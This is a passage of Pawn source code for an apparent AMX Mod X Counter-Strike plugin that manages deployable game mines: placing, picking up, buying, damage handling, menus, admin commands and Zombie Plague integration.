	if (ExecuteForward(gForwarder[FWD_SET_ENTITY_SPAWN], iReturn, iEnt, uID, iMinesId))
	{
		if (ExecuteForward(gForwarder[FWD_OVERRIDE_POS], iReturn, iEnt, uID, iMinesId))
		{
			ArrayGetArray(gPlayerData[uID], iMinesId, plData);

			// Cound up. deployed.
			plData[PL_COUNT_DEPLOYED]++;
			// Cound down. have ammo.
			plData[PL_COUNT_HAVE_MINE]--;
			ArraySetArray(gPlayerData[uID], iMinesId, plData);

			// Set Flag. end progress.
			mines_set_user_deploy_state(uID, int:STATE_DEPLOYED);

			show_ammo(id, iMinesId);
		}
	}
	gDeployingMines[uID] = 0;
	new csx_id = ArrayGetCell(gMinesCSXID, iMinesId);
	custom_weapon_shot(csx_id, uID);

	return iReturn;
}

//====================================================
// Task: Remove mines.
//====================================================
public RemoveMine(params[], id)
{
	new target;
	new Float:vOrigin[3];
	new Float:tOrigin[3];
	static plData[PLAYER_DATA];

	// Task Number to uID.
	new uID = id - TASK_RELEASE;

	new body;
	get_user_aiming(uID, target, body);

	// is valid target?
	if(!pev_valid(target))
		return;
	
	// Get Player Vector Origin.
	// Get Mine Vector Origin.
	pev(uID, pev_origin, vOrigin);
	pev(target, pev_origin, tOrigin);

	// Distance Check. far 128.0 (cm?)
	if(get_distance_f(vOrigin, tOrigin) > 128.0)
		return;
	
	static tClassName[MAX_CLASS_LENGTH];
	static iClassName[MAX_CLASS_LENGTH];
	new iMinesId = str_to_num(params);

	pev(target, pev_classname, tClassName, charsmax(tClassName));
	ArrayGetString(gMinesClass, iMinesId, iClassName, charsmax(iClassName));

	// Check. is Target Entity mines?
	if(!equali(tClassName, iClassName))
		return;

	new ownerID;
	static minesData[COMMON_MINES_DATA];
	
	if (!CED_GetCell(target, MINES_OWNER, ownerID))
		return;

	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	switch(PICKUP_MODE:minesData[PICKUP_MODE])
	{
		case DISALLOW_PICKUP:
			return;
		case ONLY_ME:
		{
			// Check. is Owner you?
			if(ownerID != uID)
				return;
		}
		case ALLOW_FRIENDLY:
		{
			// Check. is friendly team?
			if(mines_get_owner_team(target) != cs_get_user_team(uID))
				return;
		}		
	}
	new iReturn;
	ExecuteForward(gForwarder[FWD_MINES_PICKUP], iReturn, uID, target);

	// Remove!
	mines_remove_entity(target);

	ArrayGetArray(gPlayerData[uID], iMinesId, plData);
	// Collect for this removed mines.
	plData[PL_COUNT_HAVE_MINE]++;
	ArraySetArray(gPlayerData[uID], iMinesId, plData);

	if (pev_valid(ownerID))
	{
		ArrayGetArray(gPlayerData[ownerID], iMinesId, plData);
		// Return to before deploy count.
		plData[PL_COUNT_DEPLOYED]--;
		ArraySetArray(gPlayerData[ownerID], iMinesId, plData);
	}
	// Play sound.
	emit_sound(uID, CHAN_ITEM, ENT_SOUNDS[PICKUP], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	// Set Flag. end progress.
	mines_set_user_deploy_state(uID, int:STATE_DEPLOYED);

	show_ammo(id, iMinesId);

	return;
}

//====================================================
// Brocken Mines.
//====================================================
public MinesTakeDamage(victim, inflictor, attacker, Float:f_Damage, bit_Damage)
{
	static minesData[COMMON_MINES_DATA];
	static iMinesId;

	iMinesId = mines_get_minesId(victim);
	if (iMinesId == -1)
		return HAM_IGNORED;

	// We get the ID of the player who put the mine.
	new iOwner;
	if (!CED_GetCell(victim, MINES_OWNER, iOwner))
		return HAM_IGNORED;

	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	switch(minesData[MINES_BROKEN])
	{
		// 0 = mines.
		case 0:
		{
			// If the one who set the mine does not coincide with the one who attacked it, then we stop execution.
			if(iOwner != attacker)
				return HAM_SUPERCEDE;
		}
		// 1 = team.
		case 1:
		{
			// If the team of the one who put the mine and the one who attacked match.
			if(mines_get_owner_team(victim) != cs_get_user_team(attacker))
				return HAM_SUPERCEDE;
		}
		// 2 = Enemy.
		case 2:
		{
			return HAM_IGNORED;
		}
		// 3 = Enemy Only.
		case 3:
		{
			if(iOwner == attacker || mines_get_owner_team(victim) == cs_get_user_team(attacker))
				return HAM_SUPERCEDE;
		}
		default:
			return HAM_IGNORED;
	}	
	return HAM_IGNORED;
}

//====================================================
// Mines Think.
//====================================================
public MinesThinkMain(iEnt)
{
	// Check plugin enabled.
	if (!gCvarValue[VL_ENABLE])
		return HAM_IGNORED;

	// is valid this entity?
	if (!pev_valid(iEnt))
		return HAM_IGNORED;

	static iMinesId;
	iMinesId = mines_get_minesId(iEnt);

	if (iMinesId == -1)
		return HAM_IGNORED;

	static iReturn;
	ExecuteForward(gForwarder[FWD_MINES_THINK], iReturn, iEnt, iMinesId);

	return HAM_SUPERCEDE;
}
//====================================================
// Check Spectartor
//====================================================
public MinesTakeDamaged(victim, inflictor, attacker, Float:f_Damage, bit_Damage)
{
	if (!pev_valid(victim))
		return HAM_IGNORED;

	static iMinesId;
	iMinesId = mines_get_minesId(victim);

	// is this mines? no.
	if (iMinesId == -1)
		return HAM_IGNORED;

	new Float:health;
	mines_get_health(victim, health);

	if (health > 0.0)
		return HAM_IGNORED;

	new iReturn;
	ExecuteForward(gForwarder[FWD_MINES_BREAKED], iReturn, iMinesId, victim, attacker);

	return HAM_IGNORED;
}

//====================================================
// ShowInfo Hud Message
//====================================================
public MinesShowInfo(Float:vStart[3], Float:vEnd[3], Conditions, id, iTrace)
{ 
	static minesData[COMMON_MINES_DATA];

	static iHit, iOwner, Float:health;
	static hudMsg[64];
	static Float:vHitPoint[3];

	iHit = get_tr2(iTrace, TR_pHit);
	get_tr2(iTrace, TR_vecEndPos, vHitPoint);				

	// Invalid Entity
	if (!pev_valid(iHit))
		return;

	// Far distance
	if (get_distance_f(vStart, vHitPoint) > 200.0) 
		return;

	static iMinesId;
	iMinesId = mines_get_minesId(iHit);

	// Not MinesPlatform Weapon.
	if (iMinesId == -1)
		return;

	// Can't get OWNER ID.
	if (!CED_GetCell(iHit, MINES_OWNER, iOwner))
		return;

	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	mines_get_health(iHit, health);
	formatex(hudMsg, charsmax(hudMsg), "%L", id, LANG[L_MINE_HUD], iOwner, floatround(health), floatround(Float:minesData[MINE_HEALTH]));
	//set_hudmessage(red = 200, green = 100, blue = 0, Float:x = -1.0, Float:y = 0.35, effects = 0, Float:fxtime = 6.0, Float:holdtime = 12.0, Float:fadeintime = 0.1, Float:fadeouttime = 0.2, channel = -1)
	set_hudmessage(50, 100, 150, -1.0, 0.60, 0, 6.0, 0.4, 0.0, 0.0, -1);
	show_hudmessage(id, hudMsg);
} 

//====================================================
// Player killing (Set Money, Score)
//====================================================
public PlayerKilling(iVictim, inflictor, iAttacker, Float:damage, bits)
{
	static iMinesId;
	static minesData[COMMON_MINES_DATA];

	iMinesId = mines_get_minesId(iAttacker);
	if (iMinesId == -1)
		return HAM_IGNORED;

	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	if (is_user_alive(iVictim))
	{
		static health;
		mines_get_health(iVictim, health);

		if (health - damage > 0.0)
			return HAM_IGNORED;

#if !defined ZP_SUPPORT && !defined BIOHAZARD_SUPPORT
		// Get Target Team.
		new CsTeams:aTeam = cs_get_user_team(iAttacker);
		new CsTeams:vTeam = cs_get_user_team(iVictim);

		new score  = (vTeam != aTeam) ? 1 : -1;
#endif

		// Attacker Frag.
		// Add Attacker Frag (Friendly fire is minus).
		// new aFrag	= mines_get_user_frags(iAttacker) + score;
		// new aDeath	= cs_get_user_deaths(iAttacker);

		// mines_set_user_deaths(iAttacker, aDeath);
		// ExecuteHamB(Ham_AddPoints, iAttacker, aFrag - mines_get_user_frags(iAttacker), true);

		new tDeath = cs_get_user_deaths(iVictim);

		cs_set_user_deaths(iVictim, tDeath);
		// ExecuteHamB(Ham_AddPoints, iVictim, 0, true);

#if !defined ZP_SUPPORT && !defined BIOHAZARD_SUPPORT
		// Get Money attacker.
		new money  = minesData[FRAG_MONEY] * score;
		cs_set_user_money(iAttacker, cs_get_user_money(iAttacker) + money);
#endif
		return HAM_HANDLED;
	}
	return HAM_IGNORED;
}

//====================================================
// Player Cmd Start event.
// Stop movement for mine deploying.
//====================================================
public PlayerCmdStart(id, handle, random_seed)
{
	// Not alive
	if(!is_user_alive(id) || is_user_bot(id))
		return FMRES_IGNORED;

	// Get user old and actual buttons
	static iInButton, iInOldButton;
	iInButton	 = (get_uc(handle, UC_Buttons));
	iInOldButton = (get_user_oldbutton(id)) & IN_USE;

	if ((pev(id, pev_weapons) & (1 << CSW_C4)) && (iInButton & IN_ATTACK))
		return FMRES_IGNORED;

	// USE KEY
	iInButton &= IN_USE;

	if (iInButton)
	{
		if (!iInOldButton)
		{
			static body, target;
			get_user_aiming(id, target, body);

			// is valid target?
			if(!pev_valid(target))
				return FMRES_HANDLED;

			static iMinesId;
			iMinesId = mines_get_minesId(target);
			if (iMinesId != -1)
				mines_show_menu_sub(id, iMinesId);

			return FMRES_HANDLED;
		}
	}

	switch (mines_get_user_deploy_state(id))
	{
		case STATE_IDLE:
		{
			new Float:speed;
			mines_get_user_max_speed(id, speed);

			new bool:now_speed = (speed <= 1.0);
			if (now_speed)
				ExecuteHamB(Ham_CS_Player_ResetMaxSpeed, id);
		}
		case STATE_DEPLOYING:
		{
			static iEnt;
			static iMinesId;
			static iReturn;
			iEnt = gDeployingMines[id];
			// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

			if (pev_valid(iEnt) && !IsPlayer(iEnt))
			{
				iMinesId = mines_get_minesId(iEnt);
				if (!ExecuteForward(gForwarder[FWD_OVERRIDE_POS], iReturn, iEnt, id, iMinesId))
				{
					mines_cmd_progress_stop(id);
				}
			}

			mines_set_user_max_speed(id, 1.0);
		}
		case STATE_PICKING:
		{
			mines_set_user_max_speed(id, 1.0);
		}
		case STATE_DEPLOYED:
		{
			ExecuteHamB(Ham_CS_Player_ResetMaxSpeed, id);
			mines_set_user_deploy_state(id, STATE_IDLE);
		}
	}

	return FMRES_IGNORED;
}

//====================================================
// Player connected.
//====================================================
public client_putinserver(id)
{
	// Check plugin enabled.
	if (!gCvarValue[VL_ENABLE])
		return PLUGIN_CONTINUE;

	new iReturn;
	ExecuteForward(gForwarder[FWD_PUTIN_SERVER], iReturn, id);

	mines_reset_have_mines(id);

	return PLUGIN_CONTINUE;
}

//====================================================
// Player Disconnect.
//====================================================
public client_disconnected(id)
{
	// Check plugin enabled.
	if (!gCvarValue[VL_ENABLE])
		return PLUGIN_CONTINUE;
	
	new iReturn;
	ExecuteForward(gForwarder[FWD_DISCONNECTED], iReturn, id);

	// delete task.
	delete_task(id);
	// remove all mines.
	mines_remove_all_mines(id);
	return PLUGIN_CONTINUE;
}

//====================================================
// Delete Task.
//====================================================
delete_task(id)
{
	if (task_exists((TASK_PLANT + id)))
		remove_task((TASK_PLANT + id));

	if (task_exists((TASK_RELEASE + id)))
		remove_task((TASK_RELEASE + id));

	mines_set_user_deploy_state(id, STATE_IDLE);
	return;
}

//====================================================
// Check: common.
//====================================================
stock bool:CheckCommon(id, iMinesId, plData[PLAYER_DATA])
{
	new user_flags	= get_user_flags(id) & ADMIN_ACCESSLEVEL;
	new is_alive	= is_user_alive(id);

	// Plugin Enabled
	if (!gCvarValue[VL_ENABLE])
	{
		print_info(id, iMinesId, L_NOT_ACTIVE);
		return false;
	}

	// Can Access.
	if (gCvarValue[VL_ACCESS_LEVEL] && !user_flags)
	{
		print_info(id, iMinesId, L_NOT_ACCESS);
		return false;
	}

	// Is this player Alive?
	if (!is_alive) 
		return false;

	// Can set Delay time?
	// gametime - playertime = delay count.
	new nowTime = (floatround(get_gametime()) - _:plData[PL_COUNT_DELAY]);
	if(nowTime < gCvarValue[VL_START_DELAY])
	{
		new param[1];
		param[0] = gCvarValue[VL_START_DELAY] - nowTime;
		print_info(id, iMinesId, L_DELAY_SEC, param);
		return false;
	}
	return true;
}

//====================================================
// Check: Deploy.
//====================================================
stock bool:CheckDeploy(id, iMinesId)
{
	static plData[PLAYER_DATA];
	ArrayGetArray(gPlayerData[id], iMinesId, plData);

	// Check common.
	if (!CheckCommon(id, iMinesId, plData))
		return false;

	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

#if defined BIOHAZARD_SUPPORT
	// Check Started Round.
	if (!CheckRoundStarted(id, iMinesId, minesData))
		return false;
#endif

	// Have mine? (use buy system)
	if (minesData[BUY_MODE])
	{
		if (plData[PL_COUNT_HAVE_MINE] <= int:0) 
		{
			print_info(id, iMinesId, L_NOT_HAVE);
			return false;
		}
	}

	if (!CheckMaxDeploy(id, iMinesId, plData, minesData))
	{
		return false;
	}
	
	new iReturn;
	ExecuteForward(gForwarder[FWD_CHECK_DEPLOY], iReturn, id, iMinesId);

	return bool:iReturn;
}

//====================================================
// Check: Round Started
//====================================================
#if defined BIOHAZARD_SUPPORT
stock bool:CheckRoundStarted(id, iMinesId, minesData[COMMON_MINES_DATA])
{
	if (minesData[NO_ROUND])
	{
		if(!game_started())
		{
			cp_noround(id);
			return false;
		}
	}
	return true;
}
#endif

//====================================================
// Check: Remove mines.
//====================================================
public bool:CheckPickup(id, iMinesId)
{
	static plData[PLAYER_DATA];
	ArrayGetArray(gPlayerData[id], iMinesId, plData);

	if (!CheckCommon(id, iMinesId, plData))
		return false;

	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	// have max ammo? (use buy system.)
	if (minesData[BUY_MODE])
	{
		if (plData[PL_COUNT_HAVE_MINE] + int:1 > int:minesData[AMMO_HAVE_MAX])
			return false;
	}

	new target;
	new Float:vOrigin[3];
	new Float:tOrigin[3];

	new body;
	get_user_aiming(id, target, body);

	// is valid target entity?
	if(!pev_valid(target))
		return false;

	// get potision. player and target.
	pev(id,		pev_origin, vOrigin);
	pev(target, pev_origin, tOrigin);

	// Distance Check. far 128.0 (cm?)
	if(get_distance_f(vOrigin, tOrigin) > 128.0)
		return false;
	
	static minesClass[MAX_CLASS_LENGTH];
	static sClassName[MAX_CLASS_LENGTH];
	static iOwner;
	pev(target, pev_classname, sClassName, charsmax(sClassName));
	ArrayGetString(gMinesClass, iMinesId, minesClass, charsmax(minesClass));

	// is target mines?
	if(!equali(sClassName, minesClass))
		return false;

	switch(minesData[ALLOW_PICKUP])
	{
		case DISALLOW_PICKUP:
		{
			print_info(id, iMinesId, L_NOT_PICKUP);
			return false;
		}
		case ONLY_ME:
		{
			// is owner you?
			CED_GetCell(target, MINES_OWNER, iOwner);
			if(iOwner != id)
			{
				print_info(id, iMinesId, L_NOT_PICKUP);
				return false;
			}
		}
		case ALLOW_FRIENDLY:
		{
			// is team friendly?
			if(mines_get_owner_team(target) != cs_get_user_team(id))
			{
				print_info(id, iMinesId, L_NOT_PICKUP);
				return false;
			}
		}
	}

	new iReturn;
	ExecuteForward(gForwarder[FWD_CHECK_PICKUP], iReturn, id, iMinesId, target);

	// Allow Enemy.
	return true;
}

//====================================================
// Check Spectartor
//====================================================
public CheckSpectator() 
{
	new id, szTeam[2];
	id = read_data(1);
	read_data(2, szTeam, charsmax(szTeam));

	if (szTeam[0] == 'U' || szTeam[0] == 'S')
	{
		delete_task(id);
		if (mines_remove_all_mines(id))
		{
			new param[1];
			param[0] = id;
			print_info(0, 0, L_REMOVE_SPEC, param);
		}
	 } 
}

//====================================================
// Admin: Remove Player mines
//====================================================
public admin_remove_mines(id, level, cid) 
{ 
	if (!cmd_access(id, level, cid, 2)) 
		return PLUGIN_HANDLED;

	new arga[3];
	read_argv(1, arga, charsmax(arga));

	new player = cmd_target(id, arga, CMDTARGET_ALLOW_SELF);
	if (!player)
		return PLUGIN_HANDLED;

	delete_task(player);
	mines_remove_all_mines(player);

	new param[2];
	param[0] = id;
	param[1] = player;
	print_info(0, 0, L_ALL_REMOVE, param);

	return PLUGIN_HANDLED; 
} 

//====================================================
// Admin: Give Player mines
//====================================================
public admin_give_mines(id, level, cid) 
{ 
	if (!cmd_access(id, level, cid, 3))
		return PLUGIN_HANDLED;

	new arga[3];
	new argb[MAX_CLASS_LENGTH];
	read_argv(1, arga, charsmax(arga));
	read_argv(2, argb, charsmax(argb));

	new iMinesId = ArrayFindString(gMinesClass, argb);

	if (iMinesId == -1)
		return PLUGIN_HANDLED;

	new player = cmd_target(id, arga, CMDTARGET_ALLOW_SELF);
	if (!player)
		return PLUGIN_HANDLED;

	delete_task(player);
	set_start_ammo(player, iMinesId);

	new param[1];
	param[0] = player;
	print_info(0, iMinesId, L_GIVE_MINE, param);

	return PLUGIN_HANDLED; 
} 

//====================================================
// Show ammo.
//====================================================
show_ammo(id, iMinesId)
{ 
	new ammo[64];
	new minesData[COMMON_MINES_DATA];
	new plData[PLAYER_DATA];

	ArrayGetArray(gMinesParameter, iMinesId, minesData);
	if (is_user_connected(id))
	{
		if (minesData[BUY_MODE] != 0)
		{
			ArrayGetArray(gPlayerData[id], iMinesId, plData);

			new sItemName[MAX_NAME_LENGTH];
			ArrayGetString(gMinesLongName, iMinesId, sItemName, charsmax(sItemName));
			formatex(ammo, charsmax(ammo), "%L", id, sItemName);
			formatex(ammo, charsmax(ammo), "%L", id, LANG[L_STATE_AMMO], ammo, plData[PL_COUNT_HAVE_MINE], minesData[AMMO_HAVE_MAX]);
			client_print(id, print_center, ammo);
		}
	}
} 

//====================================================
// Say Command (Menu Open).
//====================================================
public say_mines(id)
{
	new said[32];
	read_argv(1, said, 31);

	if (equali(said, "mines") || equali(said, "/mines"))
	{
		mines_show_menu(id, 0);
		return PLUGIN_HANDLED;
	}
	return PLUGIN_CONTINUE;
}

//====================================================
// Mines Menu.
//====================================================
public mines_show_menu(id, iPage)
{
	new count = ArraySize(gMinesClass);
	if (count <= 0)
		return;
	
	new menu = menu_create(LANG[L_MENU_TITLE], "mines_menu_handler", true);
	new sItemName[MAX_NAME_LENGTH];
	for(new i = 0; i < count; i++)
	{
		ArrayGetString(gMinesLongName, i, sItemName, charsmax(sItemName));
		menu_additem(menu, sItemName);
	}

	menu_display(id, menu, iPage);
}

//====================================================
// Mines Menu Handler.
//====================================================
public mines_menu_handler(id, menu, item)
{
	if (item == MENU_EXIT)
	{
		menu_destroy(menu);
		return;
	}
	mines_show_menu_sub(id, item);
}

//====================================================
// Mines Sub Menu.
//====================================================
public mines_show_menu_sub(id, iMinesId)
{
	new sMinesId[3];
	new sItemName[MAX_NAME_LENGTH];

	num_to_str(iMinesId, sMinesId, charsmax(sMinesId));
	ArrayGetString(gMinesLongName, iMinesId, sItemName, charsmax(sItemName));
	formatex(sItemName, charsmax(sItemName), "%L", id, sItemName);
	new menu = menu_create(fmt("%L", id, LANG[L_SUB_MENU_TITLE], sItemName), "mines_menu_sub_handler", false);
	new minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	menu_additem(menu, fmt("%L", id, LANG[L_MENU_SELECT], 	sItemName), sMinesId, 0, gSubMenuCallback);
#if !defined ZP_SUPPORT
	menu_additem(menu, fmt("%L", id, LANG[L_MENU_BUY], 		sItemName,	minesData[BUY_PRICE]), sMinesId, 0, gSubMenuCallback);
#endif
	menu_blank(menu);
	menu_additem(menu, fmt("%L", id, LANG[L_MENU_DEPLOY], 	sItemName), sMinesId);
	menu_additem(menu, fmt("%L", id, LANG[L_MENU_PICKUP], 	sItemName), sMinesId);
	menu_blank(menu);
	menu_additem(menu, fmt("%L", id, LANG[L_MENU_EXPLOSION],sItemName), sMinesId);
	menu_display(id, menu, 0);
}

menu_blank(menu)
{
#if AMXX_VERSION_NUM > 182
	menu_addblank2(menu);
#else
	menu_addblank(menu);
#endif
}

//====================================================
// Mines Sub Menu Callback.
//====================================================
public mines_submenu_callback(id, menu, item)
{
	new szData[6], szName[64], access, callback;
	//Get information about the menu item
	menu_item_getinfo(menu, item, access, szData, charsmax(szData), szName, charsmax(szName), callback);
	new iMinesId = str_to_num(szData);
	new minesData[COMMON_MINES_DATA];

	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	switch(item)
	{
		case 0:
		{
			if (gSelectedMines[id] == iMinesId)
			{
				menu_item_setname(menu, item, ("MENU_SELECTED_ON", szName));
				return ITEM_DISABLED;
			}
		}
		case 1:
		{
			if (!minesData[BUY_MODE])
			{
				return ITEM_DISABLED;
			}
		}
	}
	return ITEM_IGNORE;
}

//====================================================
// Mines Sub Menu Handler.
//====================================================
public mines_menu_sub_handler(id, menu, item)
{
	new szData[6], szName[64], access, callback;
	//Get information about the menu item
	menu_item_getinfo(menu, item, access, szData, charsmax(szData), szName, charsmax(szName), callback);

	new iMinesId = str_to_num(szData);
	switch(item)
	{
		// Select current Mines.
		case 0:
		{
			gSelectedMines[id] = iMinesId;
			// Play sound.
			emit_sound(id, CHAN_ITEM, ENT_SOUNDS[BUTTON], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		}
		// Buy Mines.
		case 1:
			mines_buy_mine			(id, iMinesId);
		// Deploy Mines.
		case 3:
			_mines_progress_deploy	(id, iMinesId);
		// Pickup Mines.
		case 4:
			_mines_progress_pickup	(id, iMinesId);
		// All Mines Explosion.(current selected mines.)
		case 6:
			mines_all_explosion		(id, iMinesId);
		// 
		case MENU_EXIT:
		{
			if (is_user_connected(id))
			{
				mines_show_menu(id, .iPage = (item / 7));
			}
			return PLUGIN_HANDLED;
		}
	}
	mines_show_menu_sub(id, iMinesId);
	return PLUGIN_HANDLED;
}

//====================================================
// Zombie Plague Support Logic.
//====================================================
#if defined ZP_SUPPORT
public ZpMinesNative(iPlugin, iParams)
{
	new id 		 = get_param(1);
	new iMinesId = get_param(3);

	if (!is_user_alive(id))
		return;

	mines_stock_set_user_have_mine(id, iMinesId, int:get_param(2));
}

public zp_fw_core_infect_post(id, attacker)
{
	if (!gCvarValue[VL_ENABLE])
		return PLUGIN_CONTINUE;

	// Is Connected?
	if (is_user_connected(id)) 
		delete_task(id);

	// Dead Player remove mines.
	mines_remove_all_mines(id);

	return PLUGIN_HANDLED;
}

public zp_fw_items_select_pre(id, itemid, ignorecost)
{
	static szMinesName[MAX_CLASS_LENGTH];
	mines_get_mines_classname(itemid, szMinesName, charsmax(szMinesName))

	if (strlen(szMinesName) <= 0)
		return ZP_ITEM_AVAILABLE;

	if (zp_core_is_zombie(id))
		return ZP_ITEM_DONT_SHOW;

	new gamemode = zp_gamemodes_get_current();
	if (gamemode == -2)
	{
		zp_colored_print(id, "This is not available right now...");
		return ZP_ITEM_NOT_AVAILABLE;
	}

	static minesData[COMMON_MINES_DATA];
	static iMinesId;
	for(new i = 0; i < ArraySize(gMinesClass); i++)
	{
		ArrayGetArray(gMinesParameter, i, minesData);
		if (minesData[ZP_WEAPON_ID] == itemid)
		{
			iMinesId = i;
			break;
		}
	}

	zp_items_menu_text_add(fmt("[%d/%d]", mines_stock_get_user_have_mine(id, iMinesId), minesData[AMMO_HAVE_MAX]));

	if (mines_stock_get_user_have_mine(id, iMinesId) >= int:have_max)
	{
		zp_colored_print(id, "You reached the limit..");
		return ZP_ITEM_NOT_AVAILABLE;
	}

	return ZP_ITEM_AVAILABLE;
}

public zp_fw_items_select_post(id, itemid, ignorecost)
{
	new sMinesName[MAX_CLASS_LENGTH];
	new iMinesId;
	for(new i = 0; i < ArraySize(gMinesClass); i++)
	{
		ArrayGetArray(gMinesParameter, i, minesData);
		if (minesData[ZP_WEAPON_ID] == itemid)
		{
			iMinesId = i;
			break;
		}
	}

	mines_get_mines_classname(iMinesId, sMinesName, charsmax(sMinesName));
	if(strlen(sMinesName) > 0)
	{
		mines_stock_set_user_have_mine(id, iMinesId, mines_stock_get_user_have_mine(id, iMinesId) + int:1);
		cp_bought(id);
		emit_sound(id, CHAN_ITEM, ENT_SOUND, VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
}
#endif


#define INI_MAX_STRING_LEN 512

stock ini_read_string(const file[], const section[], const key[], dest[], len)
{
	new hFile;
	new iRetVal;
	new bool:bSectionFound = false;
	new szBuffer[INI_MAX_STRING_LEN], szFile[64], szKey[32], szSection[32];

	formatex(szFile[get_configsdir(szFile, charsmax(szFile))], charsmax(szFile), "/%s", file);

	if (!(hFile = fopen(szFile, "rt")))
		return 0;

	while (!feof(hFile))
	{
		if (fgets(hFile, szBuffer, charsmax(szBuffer)) == 0)
			break;

		trim(szBuffer);

		if (!szBuffer[0] || szBuffer[0] == ';' || szBuffer[0] == '#')
			continue;

		if (szBuffer[0] == '[')
		{
			if (bSectionFound)
				break;

			split_string(szBuffer[1], "]", szSection, charsmax(szSection));

			if (equali(section, szSection))
				bSectionFound = true;
		}

		if (bSectionFound)
		{
			split(szBuffer, szKey, charsmax(szKey), szBuffer, charsmax(szBuffer), "=");
			trim(szKey);
			trim(szBuffer);

			if (equali(szKey, key))
			{
#if AMXX_VERSION_NUM > 182
				replace_string(szBuffer, charsmax(szBuffer), "^"", "");
#else
				replace_all(szBuffer, charsmax(szBuffer), "^"", "");
#endif
				iRetVal = copy(dest, len, szBuffer);
				break;
			}
		}
	}

	fclose(hFile);
	return iRetVal;

}





//====================================================
// Function: Count to deployed in team.
//====================================================
stock int:mines_get_team_deployed_count(id, iMinesId, plData[PLAYER_DATA])
{
	new int:i;
	new int:count;
	new int:num;
	new team[3] = '^0';
	new players[MAX_PLAYERS];

	// Witch your team?
	switch(CsTeams:cs_get_user_team(id))
	{
		case CS_TEAM_CT: team = "CT";
		case CS_TEAM_T : team = "T";
		default:
			return int:0;
	}

	// Get your team member.
	get_players(players, num, "e", team);

	// Count your team deployed mines.
	count = int:0;
	for(i = int:0;i < num;i++)
	{
		ArrayGetArray(gPlayerData[players[i]], iMinesId, plData);
		count += plData[PL_COUNT_DEPLOYED];
	}

	return count;
}

//====================================================
// Function: Reset Have mines.
//====================================================
stock mines_reset_have_mines(id)
{
	new plData[PLAYER_DATA];
	for(new i = 0; i < ArraySize(gMinesClass); i++)
	{
		ArrayGetArray(gPlayerData[id], i, plData);

		// reset deploy count.
		plData[PL_COUNT_DEPLOYED]	= int:0;
		// reset hove mines.
		plData[PL_COUNT_HAVE_MINE]	= int:0;

		ArraySetArray(gPlayerData[id], i, plData);
	}
}

//====================================================
// Function: Remove All Mines (for id).
//====================================================
stock mines_remove_all_mines(id)
{
	static minesData[COMMON_MINES_DATA];
	new result = false;

	for(new i = 0; i < ArraySize(gMinesClass); i++)
	{
		ArrayGetArray(gMinesParameter, i, minesData);

		// Dead Player remove mines.
		if (minesData[DEATH_REMOVE])
		{
			result |= mines_remove_all_entity_main(id, i);
		}
	}
	return result;
}

//====================================================
// Buy mines.
//====================================================
stock mines_buy_mine(id, iMinesId)
{	
	if (!CheckBuyMines(id, iMinesId))
		return PLUGIN_CONTINUE;
	static plData[PLAYER_DATA];
	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	new cost = minesData[BUY_PRICE];
	cs_set_user_money(id, cs_get_user_money(id) - cost);

	ArrayGetArray(gPlayerData[id], iMinesId, plData);
	plData[PL_COUNT_HAVE_MINE]++;
	ArraySetArray(gPlayerData[id], iMinesId, plData);

	print_info(id, iMinesId, L_BOUGHT);

	emit_sound(id, CHAN_ITEM, ENT_SOUNDS[PICKUP], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);

	show_ammo(id, iMinesId);

	return PLUGIN_HANDLED;
}

//====================================================
// Function: Remove All Mines (for id+iMinesId).
//====================================================
stock mines_remove_all_entity_main(id, iMinesId)
{
	static plData[PLAYER_DATA];
	static sClassName[MAX_CLASS_LENGTH];
	new result = false;

	ArrayGetArray(gPlayerData[id], iMinesId, plData);

	if (plData[PL_COUNT_DEPLOYED] > int:0)
		result = true;

	ArrayGetString(gMinesClass, iMinesId, sClassName, charsmax(sClassName));
	mines_remove_all_entity(id, sClassName);

	// reset deploy count.
	plData[PL_COUNT_DEPLOYED] = int:0;
	ArraySetArray(gPlayerData[id], iMinesId, plData);
	
	return result;
}

//====================================================
// Check: Buy Mines
//====================================================
stock bool:CheckBuyMines(id, iMinesId)
{
	static minesData[COMMON_MINES_DATA];
	static plData[PLAYER_DATA];

	ArrayGetArray(gMinesParameter, iMinesId, minesData);
	ArrayGetArray(gPlayerData[id], iMinesId, plData);

	// Check common.
	if (!CheckCommon(id, iMinesId, plData))
		return false;

	new buymode	= 	minesData[BUY_MODE];
	new maxhave	=	minesData[AMMO_HAVE_MAX];
	new cost	= 	minesData[BUY_PRICE];
	new buyzone	=	minesData[BUY_ZONE];

	// Buy mode ON?
	if (buymode)
	{
		// Can this team buying?
		if (!CheckTeam(id, minesData))
		{
			print_info(id, iMinesId, L_NOT_BUY_TEAM);
			return false;
		}

		// Have Max?
		if (plData[PL_COUNT_HAVE_MINE] >= int:maxhave)
		{
			print_info(id, iMinesId, L_MAX_HAVE);
			return false;
		}

		// buyzone area?
		if (buyzone && !cs_get_user_buyzone(id))
		{
			print_info(id, iMinesId, L_NOT_BUYZONE);
			return false;
		}

		// Have money?
		if (cs_get_user_money(id) < cost)
		{
			print_info(id, iMinesId, L_NOT_MONEY);
			return false;
		}

	}
	else
	{
		print_info(id, iMinesId, L_NOT_BUY);
		return false;
	}

	return true;
}

stock get_long_name(id, iMinesId)
{
	new sLongName[MAX_NAME_LENGTH];
	ArrayGetString(gMinesLongName, iMinesId, sLongName, charsmax(sLongName));
	formatex(sLongName, charsmax(sLongName), "%L", id, sLongName);
	return sLongName;
}
//====================================================
// Check: Can use this Team.
//====================================================
stock bool:CheckTeam(id, minesData[COMMON_MINES_DATA])
{
	new CsTeams:team;

	team = CsTeams:minesData[BUY_TEAM];

	// Cvar setting equal your team? Not.
	if(team != CS_TEAM_UNASSIGNED && team != cs_get_user_team(id))
		return false;

	return true;
}

//====================================================
// Check: Max Deploy.
//====================================================
